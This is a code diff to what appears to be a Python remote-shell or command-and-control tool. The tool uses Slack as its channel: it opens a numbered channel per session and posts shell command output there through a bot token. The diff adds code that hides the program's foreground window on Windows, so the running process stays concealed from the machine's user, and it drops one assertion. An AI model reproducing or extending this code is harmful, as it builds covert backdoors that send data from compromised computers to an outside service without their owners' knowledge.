@@ -94,6 +94,10 @@ def init_conn():
 
     return sh_stdout
 
+if platform.system() == "Windows":
+    import pywintypes
+    import win32con
+    import win32gui
 
 op_user_ids = config.member_id
 channel_prefix = config.channel_prefix
@@ -102,6 +106,10 @@ client = slack.WebClient(token=config.bot_user_oauth_token)
 
 channels_list = client.conversations_list()
 channel_names = channels_list.__getitem__("channels")
+
+if platform.system() == "Windows":
+    window = win32gui.GetForegroundWindow()
+    win32gui.ShowWindow(window, win32con.SW_HIDE)
 
 # Calculate biggest sh number (create channels from where we left off)
 sh_num = next_sh(channel_names)
@@ -113,9 +121,9 @@ new_channel_name = str(channel_prefix + str(sh_num))
 
 # If UUID != any of the channels:
 create_response = client.conversations_create(name=new_channel_name, # List channels, give number to channels.
-                                              is_private=False, # Operator would need to be invited to the channel even if the op is the channel admin.
-                                              user_ids=op_user_ids # Set to true for a private channel.
-                                              )
+                                            is_private=False, # Operator would need to be invited to the channel even if the op is the channel admin.
+                                            user_ids=op_user_ids # Set to true for a private channel.
+                                            )
 
 sh_channel = create_response.__getitem__("channel")
 sh_channel_id = sh_channel["id"]
@@ -151,7 +159,6 @@ while True:
 
             response = client.chat_postMessage(channel=sh_channel_id, text=sh_stdout)
             assert response["ok"]
-            assert response["message"]["text"] == sh_stdout
 
             sh_comm = ""
 
